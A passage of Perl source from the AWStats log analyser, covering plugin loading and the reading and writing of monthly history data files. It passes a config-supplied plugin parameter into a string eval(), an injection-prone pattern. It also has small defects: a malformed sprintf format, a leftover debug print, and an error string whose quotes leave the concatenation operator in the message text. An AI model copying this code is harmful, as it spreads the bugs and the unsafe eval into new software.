                        if(!$loadret || $loadret =~ /^error/i){
                            # Load failed, we stop here
                            error("Plugin load for plugin '$pluginname' failed with return code: $loadret");
                        }
                        my $ret; # To get init return
                        my $initfunction = "\$ret=Init_$pluginname('$pluginparam')";
                        my $initret = eval("$initfunction");
                        if($initret && $initret eq 'xxx'){
                            $initret = 'Error: The PluginHooksFunctions variable defined ".
                                       "in plugin file does not contain list of hooked functions';
                        }
                        if(!$initret || $initret =~ /^error/i){
                            # Init function failed, we stop here
                            error("Plugin init for plugin '$pluginname' failed with return code: " . 
                                  ($initret ? "$initret" : "$@ (A module required by plugin might be missing)."));
                        }

                        # Plugin load and init successfull
                        foreach my $elem (split(/\s+/, $initret)){
                            # Some functions can only be plugged once
                            my @uniquefunc = (
                                   'GetCountryCodeByName',
                                   'GetCountryCodeByAddr',
                                   'ChangeTime',
                                   'GetTimeZoneTitle',
                                   'GetTime',
                                   'SearchFile',
                                   'LoadCache',
                                   'SaveHash',
                                   'ShowMenu'
                               );
                            my $isuniquefunc = 0;
                            foreach my $function (@uniquefunc){
                                if("$elem" eq "$function"){
                                # We try to load a 'unique' function, so we check and stop if already loaded
                                    foreach my $otherpluginname(keys %{$PluginsLoaded{"$elem"}}){
                                        error("Conflict between plugin '$pluginname' and ".
                                              "'$otherpluginname'. They both implements the ".
                                              "'must be unique' function '$elem'.\nYou must ".
                                              "choose between one of them. Using together is not possible.");
                                    }
                                    $isuniquefunc = 1;
                                    last;
                                }
                            }
                            if($isuniquefunc){
                                # TODO Use $PluginsLoaded{"$elem" }="$pluginname"; for unique func
                                $PluginsLoaded{"$elem"}{"$pluginname"} = 1;
                            }else{
                                $PluginsLoaded{"$elem"}{"$pluginname"} = 1;
                            }
                            if("$elem" =~ /SectionInitHashArray/){
                                $AtLeastOneSectionPlugin = 1;
                            }
                        }
                        $PluginsLoaded{'init'}{"$pluginname"} = 1;
                        last;
                    }
                }
                if(!$PluginsLoaded{'init'}{"$pluginname"}){
                    error("AWStats config file contains a directive to load plugin ".
                          "\"$pluginname\" (LoadPlugin=\"$plugininfo\") but AWStats ".
                          "can't open plugin file \"$pluginfile.pm\" for read.\nCheck ".
                          "if file is in \"" . ($PossiblePluginsDir[0]) . "\" directory and is readable.");
                }
            }else{
                warning("Warning: Tried to load plugin \"$pluginname\" twice. Fix config file.");
            }
        }else {
            error("Plugin \"$pluginfile\" is not a valid plugin name.");
        }
    }

    # In output mode, geo ip plugins are not loaded, so message 
    # changes are done here (can't be done in plugin init function)
    if($PluginsLoaded{'init'}{'geoip'} || $PluginsLoaded{'init'}{'geoipfree'}){
        $Message[17] = $Message[25] = $Message[148];
    }
 }

#------------------------------------------------------------------------------
# Function:        Read history file and create or update tmp history file
# Parameters:    year,month,day,hour,withupdate,withpurge,part_to_load[,lastlinenb,lastlineoffset,lastlinechecksum]
# Input:        $DirData $PROG $FileSuffix $LastLine $DatabaseBreak
# Output:        None
# Return:        Tmp history file name created/updated or '' if withupdate is 0
#------------------------------------------------------------------------------
sub Read_History_With_TmpUpdate
{
    my $year  = sprintf("%04i", shift || 0);
    my $month = sprintf("%02i", shift || 0);
    my $day   = shift;
    if($day ne ''){
        $day = sprintf("%02i", $day);
    }
    my $hour = shift;
    if($hour ne ''){
        $hour = sprintf("%02i", $hour);
    }
    my $withupdate = shift || 0;
    my $withpurge  = shift || 0;
    my $part       = shift || '';
    my ($date, $filedate) = ('', '');
    if($DatabaseBreak eq 'month'){
            $date     = sprintf("%04i%02i", $year,  $month);
            $filedate = sprintf("%02i%04i", $month, $year);
    }elsif($DatabaseBreak eq 'year'){
        $date     = sprintf("%04i%", $year);
        $filedate = sprintf("%04i",  $year);
    }elsif($DatabaseBreak eq 'day'){
        $date     = sprintf("%04i%02i%02i", $year,  $month, $day);
        $filedate = sprintf("%02i%04i%02i", $month, $year,  $day);
    }elsif($DatabaseBreak eq 'hour'){
        $date     = sprintf("%04i%02i%02i%02i", $year,  $month, $day, $hour);
        $filedate = sprintf("%02i%04i%02i%02i", $month, $year,  $day, $hour);
    }

    my $lastlinenb       = shift || 0;
    my $lastlineoffset   = shift || 0;
    my $lastlinechecksum = shift || 0;
    my %allsections = (
        'general'               => 1,
        'misc'                  => 2,
        'time'                  => 3,
        'visitor'               => 4,
        'day'                   => 5,
        'domain'                => 6,
        'cluster'               => 7,
        'login'                 => 8,
        'robot'                 => 9,
        'worms'                 => 10,
        'emailsender'           => 11,
        'emailreceiver'         => 12,
        'session'               => 13,
        'sider'                 => 14,
        'filetypes'             => 15,
        'downloads'             => 16,
        'os'                    => 17,
        'browser'               => 18,
        'screensize'            => 19,
        'unknownreferer'        => 20,
        'unknownrefererbrowser' => 21,
        'origin'                => 22,
        'sereferrals'           => 23,
        'pagerefs'              => 24,
        'searchwords'           => 25,
        'keywords'              => 26,
        'errors'                => 27,
        'webvisit'              => 28,
    );

    my $order = (scalar keys %allsections) + 1;
    foreach (keys %TrapInfosForHTTPErrorCodes){
        $allsections{"sider_$_"} = $order++;
    }
    foreach (1 .. @ExtraName - 1){
        $allsections{"extra_$_"} = $order++;
    }
    foreach (keys %{ $PluginsLoaded{'SectionInitHashArray'}}){
        $allsections{"plugin_$_"} = $order++;
    }

    # Variable used to read old format history files
    # Define SectionsToLoad (which sections to load)
    my $withread = 0;
    my $readvisitorforbackward = 0;
    my %SectionsToLoad = ();
    if($part eq 'all'){ # Load all needed sections
        my $order = 1;
        $SectionsToLoad{'general'} = $order++;

        # When
        # Always loaded because needed to count TotalPages, TotalHits, TotalBandwidth
        $SectionsToLoad{'time'} = $order++;
        if($UpdateStats){
            $SectionsToLoad{'visitor'} = $order++;
            $SectionsToLoad{'day'} = $order++;
            $SectionsToLoad{'domain'} = $order++;
            $SectionsToLoad{'login'} = $order++;
            $SectionsToLoad{'robot'} = $order++;
            $SectionsToLoad{'worms'} = $order++;
            $SectionsToLoad{'emailsender'} = $order++;
            $SectionsToLoad{'emailreceiver'} = $order++;
            $SectionsToLoad{'session'} = $order++;
            $SectionsToLoad{'sider'} = $order++;
            $SectionsToLoad{'filetypes'} = $order++;
            $SectionsToLoad{'downloads'} = $order++;
            $SectionsToLoad{'os'} = $order++;
            $SectionsToLoad{'browser'} = $order++;
            $SectionsToLoad{'unknownreferer'} = $order++;
            $SectionsToLoad{'unknownrefererbrowser'} = $order++;
            $SectionsToLoad{'screensize'} = $order++;
            $SectionsToLoad{'origin'} = $order++;
            $SectionsToLoad{'sereferrals'} = $order++;
            $SectionsToLoad{'pagerefs'} = $order++;
            $SectionsToLoad{'searchwords'} = $order++;
            $SectionsToLoad{'keywords'} = $order++;
            $SectionsToLoad{'misc'} = $order++;
            $SectionsToLoad{'errors'} = $order++;
            $SectionsToLoad{'webvisit'} = $order++;
            foreach (keys %TrapInfosForHTTPErrorCodes){
                $SectionsToLoad{"sider_$_"} = $order++;
            }
            $SectionsToLoad{'cluster'} = $order++;
            foreach (1 .. @ExtraName - 1){
                $SectionsToLoad{"extra_$_"} = $order++;
            }
            foreach (keys %{$PluginsLoaded{'SectionInitHashArray'}}){
                $SectionsToLoad{"plugin_$_"} = $order++;
            }
        }
    }else{ # Load only required sections
        my $order = 1;
        foreach (split(/\s+/, $part)){
            $SectionsToLoad{$_} = $order++;
        }
    }

    # Define SectionsToSave (which sections to save)
    my %SectionsToSave = ();
    if($withupdate){
        if($SectionsToBeSaved eq 'all'){
            %SectionsToSave = %allsections;
        }else{
            my $order = 1;
            foreach(split(/\s+/, $SectionsToBeSaved)){
                $SectionsToSave{$_} = $order++;
            }
        }
    }

    # Define value for filetowrite and filetoread 
    #(Month before Year kept for backward compatibility)
    my $filetowrite = '';
    my $filetoread  = '';
    if($HistoryAlreadyFlushed{"$year$month$day$hour"}
       && -s "$DirData/$PROG$filedate$FileSuffix.tmp.$$"){
        # tmp history file was already flushed
        $filetoread  = "$DirData/$PROG$filedate$FileSuffix.tmp.$$";
        $filetowrite = "$DirData/$PROG$filedate$FileSuffix.tmp.$$.bis";
    }else{
        $filetoread  = "$DirData/$PROG$filedate$FileSuffix.txt";
        $filetowrite = "$DirData/$PROG$filedate$FileSuffix.tmp.$$";
        print "$filetoread, $filetowrite\n";
    }

    # Is there an old data file to read or, if migrate, can we open the file for read
    if(-s $filetoread){
        $withread = 1;
    }
    # Open files
    if($withread){
        open(HISTORY, $filetoread) || error("Couldn't open file \"$filetoread\" for read: $!", "", "", "");
        # Avoid premature EOF due to history files corrupted with \cZ or bin chars
        binmode HISTORY;
    }
    if($withupdate){
        open(HISTORYTMP, ">$filetowrite") || error("Couldn't open file \"$filetowrite\" for write: $!");
        binmode HISTORYTMP;
        Save_History("header", $year, $month, $date);
    }

    # Loop on read file
    my $readxml = 1;
    if($withread){
        my $countlines = 0;
        my $versionnum = 0;
        my @field      = ();
        while(<HISTORY>){
            chomp $_;
            s/\r//;
            $countlines++;

            # Extract version from first line
            # Analyze fields
            # Here version MUST be defined
            if(!$versionnum && $_ =~ /^AWSTATS DATA FILE (\d+).(\d+)/i){
                $versionnum = ($1 * 1000) + $2;
                next;
            }
            @field = split(/\s+/, $_);
            if(!$field[0]){
                next;
            }
            if($versionnum < 5000){
                error("History file '$filetoread' is to old (version '$versionnum').".
                      "This version of AWStats is not compatible with very old history files.".
                      "Remove this history file or use first a previous AWStats version ".
                      "to migrate it from command line with command: $PROG.$Extension ".
                      "-migrate=\"$filetoread\".", "", "", 1);
            }

            # BEGIN_GENERAL
            # TODO Manage GENERAL in a loop like other sections.
            if($field[0] eq 'BEGIN_GENERAL'){
                next;
            }
            if($field[0] eq 'LastLine'){
                if(!$LastLine || $LastLine < int($field[1])){
                    $LastLine = int($field[1]);
                }
                if($field[2]){$LastLineNumber   = int($field[2]);}
                if($field[3]){$LastLineOffset   = int($field[3]);}
                if($field[4]){$LastLineChecksum = int($field[4]);}
                next;
            }
            if($field[0] eq 'FirstTime'){
                if(!$FirstTime{$date} || $FirstTime{$date} > int($field[1])){
                    $FirstTime{$date} = int($field[1]);
                }
                next;
            }
            if($field[0] eq 'LastTime'){
                if(!$LastTime{$date} || $LastTime{$date} < int($field[1])){
                    $LastTime{$date} = int($field[1]);
                }
                next;
            }
            if($field[0] eq 'LastUpdate'){
                if(!$LastUpdate){
                    $LastUpdate = int($field[1]);
                }
                next;
            }
            if($field[0] eq 'TotalVisits'){
                if(!$withupdate){
                    $MonthVisits{$year . $month} += int($field[1]);
                }
                next;
            }
            if($field[0] eq 'TotalUnique'){
                if(!$withupdate){
                    $MonthUnique{$year . $month} += int($field[1]);
                }
                next;
            }
            if($field[0] eq 'MonthHostsKnown'){
                if(!$withupdate){
                    $MonthHostsKnown{$year . $month} += int($field[1]);
                }
                next;
            }
            if($field[0] eq 'MonthHostsUnknown'){
                if(!$withupdate){
                    $MonthHostsUnknown{$year . $month} += int($field[1]);
                }
                next;
            }
            if($field[0] eq 'END_GENERAL'){
                delete $SectionsToLoad{'general'};
                if($SectionsToSave{'general'}){
                    Save_History('general', $year, $month, $date, $lastlinenb,
                                 $lastlineoffset, $lastlinechecksum);
                    delete $SectionsToSave{'general'};
                }
                last;
            }
        }
    }

    if($withupdate){
        # Process rest of data saved in 'wait' arrays (data for hosts 
        # that are not in history file or no history file found)
        # This can change some values for day, sider and session sections
        foreach (keys %_waithost_e){
            my $newtimehosts = ($_waithost_s{$_} ? $_waithost_s{$_} : $_host_s{$_});
            my $newtimehostl = ($_waithost_l{$_} ? $_waithost_l{$_} : $_host_l{$_});
            $_url_e{$_waithost_e{$_}}++;
            $newtimehosts =~ /^(\d\d\d\d\d\d\d\d)/;
            $DayVisits{$1}++;
            if($_waithost_s{$_}){
                # There was also a second session in processed log
                $_session{GetSessionRange($newtimehosts, $newtimehostl)}++;
            }
        }
    }

    # Write all unwrote sections in section order ('general','time', 'day','sider','session' and other...)
    foreach my $key(sort {$SectionsToSave{$a} <=> $SectionsToSave{$b}} keys %SectionsToSave){
        Save_History("$key", $year, $month, $date, $lastlinenb, $lastlineoffset, $lastlinechecksum);
    }
    %SectionsToSave = ();

    # Update offset in map section and last data in general section then close files
    if($withupdate){
        # Update offset of sections in the MAP section
        foreach (sort {$PosInFile{$a} <=> $PosInFile{$b}} keys %ValueInFile){
            if($PosInFile{"$_"}){
                seek(HISTORYTMP, $PosInFile{"$_"}, 0);
                print HISTORYTMP $ValueInFile{"$_"};
            }
        }

        # Save last data in general sections
        seek(HISTORYTMP, $PosInFile{"TotalVisits"}, 0);
        print HISTORYTMP $MonthVisits{$year . $month};
        seek(HISTORYTMP, $PosInFile{"TotalUnique"}, 0);
        print HISTORYTMP $MonthUnique{$year . $month};
        seek(HISTORYTMP, $PosInFile{"MonthHostsKnown"}, 0);
        print HISTORYTMP $MonthHostsKnown{$year . $month};
        seek(HISTORYTMP, $PosInFile{"MonthHostsUnknown"}, 0);
        print HISTORYTMP $MonthHostsUnknown{$year . $month};
        close(HISTORYTMP) || error("Failed to write temporary history file");
    }
    if($withread){
        close(HISTORY) || error("Command for pipe '$filetoread' failed");
    }

    # Purge data
    if($withpurge){
        &Init_HashArray();
    }

    # If update, rename tmp file bis into tmp file or set HistoryAlreadyFlushed
    if($withupdate){
        if($HistoryAlreadyFlushed{"$year$month$day$hour"}){
            if(rename($filetowrite, $filetoread) == 0){
                error("Failed to update tmp history file $filetoread");
            }
        }else{
            $HistoryAlreadyFlushed{"$year$month$day$hour"} = 1;
        }
        if(!$ListOfYears{"$year"} || $ListOfYears{"$year"} lt "$month"){
            $ListOfYears{"$year"} = "$month";
        }
    }

    # For backward compatibility, if LastLine does not exist, set to LastTime
    $LastLine ||= $LastTime{$date};
    return ($withupdate ? "$filetowrite" : "");
 }

#------------------------------------------------------------------------------
# Function:        Save a part of history file
# Parameters:    sectiontosave,year,month,breakdate[,lastlinenb,lastlineoffset,lastlinechecksum]
# Input:        $VERSION HISTORYTMP $nowyear $nowmonth $nowday $nowhour $nowmin $nowsec $LastLineNumber $LastLineOffset $LastLineChecksum
# Output:        None
# Return:        None
#------------------------------------------------------------------------------
sub Save_History
{
    my $sectiontosave    = shift || '';
    my $year             = shift || '';
    my $month            = shift || '';
    my $breakdate        = shift || '';
    my $lastlinenb       = shift || 0;
    my $lastlineoffset   = shift || 0;
    my $lastlinechecksum = shift || 0;
    if(!$lastlinenb){ # This happens for migrate
        $lastlinenb       = $LastLineNumber;
        $lastlineoffset   = $LastLineOffset;
        $lastlinechecksum = $LastLineChecksum;
    }

    my %keysinkeylist = ();
    my $spacebar = "                    ";
    # Header
    if($sectiontosave eq 'header'){
        print HISTORYTMP "AWSTATS DATA FILE $VERSION\n";
        print HISTORYTMP "# If you remove this file, all statistics for date $breakdate will be lost/reset.\n";
        print HISTORYTMP "# Last config file used to build this data file was $FileConfig.\n";
        print HISTORYTMP "# Position (offset in bytes) in this file for beginning of each section for\n";
        print HISTORYTMP "# direct I/O access. If you made changes somewhere in this file, you should\n";
        print HISTORYTMP "# also remove completely the MAP section (AWStats will rewrite it at next\n";
        print HISTORYTMP "# update).\n";
        print HISTORYTMP "BEGIN_MAP " . (26 + (scalar keys %TrapInfosForHTTPErrorCodes) +
                         (scalar @ExtraName ? scalar @ExtraName - 1 : 0) + 
                         (scalar keys %{$PluginsLoaded{'SectionInitHashArray'}})) . "\n";
        print HISTORYTMP "POS_GENERAL ";
        $PosInFile{"general"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";

        # When
        print HISTORYTMP "POS_TIME ";
        $PosInFile{"time"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_VISITOR ";
        $PosInFile{"visitor"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_DAY ";
        $PosInFile{"day"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";

        # Who
        print HISTORYTMP "POS_DOMAIN";
        $PosInFile{"domain"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_LOGIN ";
        $PosInFile{"login"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_ROBOT ";
        $PosInFile{"robot"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_WORMS ";
        $PosInFile{"worms"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_EMAILSENDER ";
        $PosInFile{"emailsender"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_EMAILRECEIVER ";
        $PosInFile{"emailreceiver"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";

        # Navigation
        print HISTORYTMP "POS_SESSION ";
        $PosInFile{"session"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_SIDER ";
        $PosInFile{"sider"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_FILETYPES ";
        $PosInFile{"filetypes"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_DOWNLOADS ";
        $PosInFile{'downloads'} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_OS ";
        $PosInFile{"os"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_BROWSER ";
        $PosInFile{"browser"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_SCREENSIZE ";
        $PosInFile{"screensize"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_UNKNOWNREFERER ";
        $PosInFile{'unknownreferer'} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_UNKNOWNREFERERBROWSER ";
        $PosInFile{'unknownrefererbrowser'} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";

        # Referers
        print HISTORYTMP "POS_ORIGIN ";
        $PosInFile{"origin"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_SEREFERRALS ";
        $PosInFile{"sereferrals"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_PAGEREFS ";
        $PosInFile{"pagerefs"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_SEARCHWORDS ";
        $PosInFile{"searchwords"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_KEYWORDS ";
        $PosInFile{"keywords"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";

        # Others
        print HISTORYTMP "POS_MISC ";
        $PosInFile{"misc"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_ERRORS ";
        $PosInFile{"errors"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_WEBVISIT ";
        $PosInFile{"webvisit"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "POS_CLUSTER ";
        $PosInFile{"cluster"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        foreach (keys %TrapInfosForHTTPErrorCodes){
            print HISTORYTMP "POS_SIDER_$_ ";
            $PosInFile{"sider_$_" } = tell HISTORYTMP;
            print HISTORYTMP "$spacebar\n";
        }
        foreach (1 .. @ExtraName - 1){
            print HISTORYTMP "POS_EXTRA_$_ ";
            $PosInFile{"extra_$_" } = tell HISTORYTMP;
            print HISTORYTMP "$spacebar\n";
        }
        foreach (keys %{ $PluginsLoaded{'SectionInitHashArray' } }){
            print HISTORYTMP "POS_PLUGIN_$_ ";
            $PosInFile{"plugin_$_" } = tell HISTORYTMP;
            print HISTORYTMP "$spacebar\n";
        }
        print HISTORYTMP "END_MAP\n";
    }

    # General
    if($sectiontosave eq 'general'){
        $LastUpdate = int("$nowyear$nowmonth$nowday$nowhour$nowmin$nowsec");
        print HISTORYTMP "\n";
        print HISTORYTMP "# LastLine    = Date of last record processed - ".
                         "Last record line number in last log - Last record ".
                         "offset in last log - Last record signature value\n";
        print HISTORYTMP "# FirstTime   = Date of first visit for history file\n";
        print HISTORYTMP "# LastTime    = Date of last visit for history file\n";
        print HISTORYTMP "# LastUpdate  = Date of last update - Nb of parsed records ".
                         "- Nb of parsed old records - Nb of parsed new records - ".
                         "Nb of parsed corrupted - Nb of parsed dropped\n";
        print HISTORYTMP "# TotalVisits = Number of visits\n";
        print HISTORYTMP "# TotalUnique = Number of unique visitors\n";
        print HISTORYTMP "# MonthHostsKnown   = Number of hosts known\n";
        print HISTORYTMP "# MonthHostsUnKnown = Number of hosts unknown\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_GENERAL 8\n";
        print HISTORYTMP "LastLine " . ($LastLine > 0 ? $LastLine : $LastTime{$breakdate}) .
                         " $lastlinenb $lastlineoffset $lastlinechecksum\n";
        print HISTORYTMP "FirstTime " . $FirstTime{$breakdate} . "\n";
        print HISTORYTMP "LastTime " . $LastTime{$breakdate} . "\n";
        print HISTORYTMP "LastUpdate $LastUpdate $NbOfLinesParsed $NbOfOldLines ".
                         "$NbOfNewLines $NbOfLinesCorrupted $NbOfLinesDropped\n";
        print HISTORYTMP "TotalVisits ";
        $PosInFile{"TotalVisits"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "TotalUnique ";
        $PosInFile{"TotalUnique"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "MonthHostsKnown ";
        $PosInFile{"MonthHostsKnown"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "MonthHostsUnknown ";
        $PosInFile{"MonthHostsUnknown"} = tell HISTORYTMP;
        print HISTORYTMP "$spacebar\n";
        print HISTORYTMP "END_GENERAL\n";
        # END_GENERAL on a new line following xml tag because 
        # END_ detection does not work like other sections
    }

    # When
    if($sectiontosave eq 'time'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Hour - Pages - Hits - Bandwidth - Not viewed Pages ".
                         "- Not viewed Hits - Not viewed Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_TIME 24\n";
        for(my $ix = 0; $ix <= 23; $ix++){
            print HISTORYTMP "$ix " . int($_time_p[$ix]) . 
                             " " . int($_time_h[$ix]) . 
                             " " . int($_time_k[$ix]) . 
                             " " . int($_time_nv_p[$ix]) .
                             " " . int($_time_nv_h[$ix]) .
                             " " . int($_time_nv_k[$ix]) . "\n";
        }
        print HISTORYTMP "END_TIME\n";
    }
    if($sectiontosave eq 'day'){
        # This section must be saved after VISITOR section is read
        print HISTORYTMP "\n";
        print HISTORYTMP "# Date - Pages - Hits - Bandwidth - Visits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_DAY " . (scalar keys %DayHits) . "\n";
        my $monthvisits = 0;
        foreach (sort keys %DayHits){
            if($_ =~ /^$year$month/i){
                # Found a day entry of the good month
                my $page   = $DayPages{$_}  || 0;
                my $hits   = $DayHits{$_}   || 0;
                my $bytes  = $DayBytes{$_}  || 0;
                my $visits = $DayVisits{$_} || 0;
                print HISTORYTMP "$_ $page $hits $bytes $visits\n";
                $monthvisits += $visits;
            }
        }
        $MonthVisits{$year . $month} = $monthvisits;
        print HISTORYTMP "END_DAY\n";
    }

    # Who
    if($sectiontosave eq 'domain'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Domain - Pages - Hits - Bandwidth\n";
        print HISTORYTMP "# The $MaxNbOf{'Domain'} first Pages must ".
                         "be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_DOMAIN " . (scalar keys %_domener_h) . "\n";

        # We save page list in score sorted order to get 
        # a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'Domain'}, $MinHit{'Domain'}, \%_domener_h, \%_domener_p);
        my %keysinkeylist = ();
        foreach (@keylist){
            $keysinkeylist{$_} = 1;
            my $page = $_domener_p{$_} || 0;
            # ||0 could be commented to reduce history file size
            my $bytes = $_domener_k{$_} || 0;
            print HISTORYTMP "$_ $page $_domener_h{$_} $bytes\n";
        }
        foreach (keys %_domener_h){
            if($keysinkeylist{$_}){
                next;
            }
            my $page = $_domener_p{$_} || 0;
            # ||0 could be commented to reduce history file size
            my $bytes = $_domener_k{$_} || 0;
            print HISTORYTMP "$_ $page $_domener_h{$_} $bytes\n";
        }
        print HISTORYTMP "END_DOMAIN\n";
    }
    if($sectiontosave eq 'visitor'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Host - Pages - Hits - Bandwidth - Last visit date - ".
                         "[Start date of last visit] - [Last page of last visit]\n";
        print HISTORYTMP "# [Start date of last visit] and [Last page of last visit] ".
                         "are saved only if session is not finished\n";
        print HISTORYTMP "# The $MaxNbOf{'HostsShown'} first Hits must be ".
                         "first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_VISITOR " . (scalar keys %_host_h) . "\n";
        my $monthhostsknown = 0;

        # We save page list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \%_host_h, \%_host_p);
        my %keysinkeylist = ();
        foreach my $key (@keylist){
            if ( $key !~ /^\d+\.\d+\.\d+\.\d+$/ && $key !~ /^[0-9A-F]*:/i ){
                $monthhostsknown++;
            }
            $keysinkeylist{$key} = 1;
            my $page      = $_host_p{$key} || 0;
            my $bytes     = $_host_k{$key} || 0;
            my $timehostl = $_host_l{$key} || 0;
            my $timehosts = $_host_s{$key} || 0;
            my $lastpage  = $_host_u{$key} || '';
            if ($timehostl && $timehosts && $lastpage){
                if(($timehostl + $VISITTIMEOUT) < $LastLine){
                    # Session for this user is expired
                    if($timehosts){
                        $_session{GetSessionRange($timehosts, $timehostl)}++;
                    }
                    if($lastpage){
                        $_url_x{$lastpage}++;
                    }
                    delete $_host_s{$key};
                    delete $_host_u{$key};
                    print HISTORYTMP "$key $page $_host_h{$key} $bytes $timehostl\n";
                }else{
                    # If this user has started a new session that is not expired
                    print HISTORYTMP "$key $page $_host_h{$key} $bytes $timehostl $timehosts $lastpage\n";
                }
            }else{
                my $hostl = $timehostl || '';
                print HISTORYTMP "$key $page $_host_h{$key} $bytes $hostl\n";
            }
        }
        foreach my $key (keys %_host_h){
            if($keysinkeylist{$key}){
                next;
            }
            if($key !~ /^\d+\.\d+\.\d+\.\d+$/ && $key !~ /^[0-9A-F]*:/i){
                $monthhostsknown++;
            }
            my $page      = $_host_p{$key} || 0;
            my $bytes     = $_host_k{$key} || 0;
            my $timehostl = $_host_l{$key} || 0;
            my $timehosts = $_host_s{$key} || 0;
            my $lastpage  = $_host_u{$key} || '';
            if($timehostl && $timehosts && $lastpage){
                if(($timehostl + $VISITTIMEOUT) < $LastLine){
                    # Session for this user is expired
                    if($timehosts){
                        $_session{GetSessionRange( $timehosts, $timehostl)}++;
                    }
                    if($lastpage){
                        $_url_x{$lastpage}++;
                    }
                    delete $_host_s{$key};
                    delete $_host_u{$key};
                    print HISTORYTMP "$key $page $_host_h{$key} $bytes $timehostl\n";
                }else{
                    # If this user has started a new session that is not expired
                    print HISTORYTMP "$key $page $_host_h{$key} $bytes $timehostl $timehosts $lastpage\n";
                }
            }else{
                my $hostl = $timehostl || '';
                print HISTORYTMP "$key $page $_host_h{$key} $bytes $hostl\n";
            }
        }
        $MonthUnique{$year . $month}       = (scalar keys %_host_p);
        $MonthHostsKnown{$year . $month}   = $monthhostsknown;
        $MonthHostsUnknown{$year . $month} = (scalar keys %_host_h) - $monthhostsknown;
        print HISTORYTMP "END_VISITOR\n";
    }
    if($sectiontosave eq 'login'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Login - Pages - Hits - Bandwidth - Last visit\n";
        print HISTORYTMP "# The $MaxNbOf{'LoginShown'} first Pages must ".
                         "be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_LOGIN " . (scalar keys %_login_h) . "\n";
        # We save login list in score sorted order 
        # to get a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \%_login_h, \%_login_p);
        my %keysinkeylist = ();
        foreach (@keylist){
            $keysinkeylist{$_} = 1;
            print HISTORYTMP "$_ " . int($_login_p{$_} || 0) .
                             " " . int($_login_h{$_} || 0) .
                             " " . int($_login_k{$_} || 0) .
                             " " . ($_login_l{$_} || '') . "\n";
        }
        foreach (keys %_login_h){
            if($keysinkeylist{$_}){
                next;
            }
            print HISTORYTMP "$_ " . int($_login_p{$_} || 0) .
                             " " . int($_login_h{$_} || 0) .
                             " " . int($_login_k{$_} || 0) .
                             " " . ($_login_l{$_} || '') . "\n";
        }
        print HISTORYTMP "END_LOGIN\n";
    }
    if($sectiontosave eq 'robot'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt\n";
        print HISTORYTMP "# The $MaxNbOf{'RobotShown'} first Hits must ".
                         "be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_ROBOT " . (scalar keys %_robot_h) . "\n";

        # We save robot list in score sorted order to 
        # get a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \%_robot_h, \%_robot_h);
        my %keysinkeylist = ();
        foreach (@keylist){
            $keysinkeylist{$_} = 1;
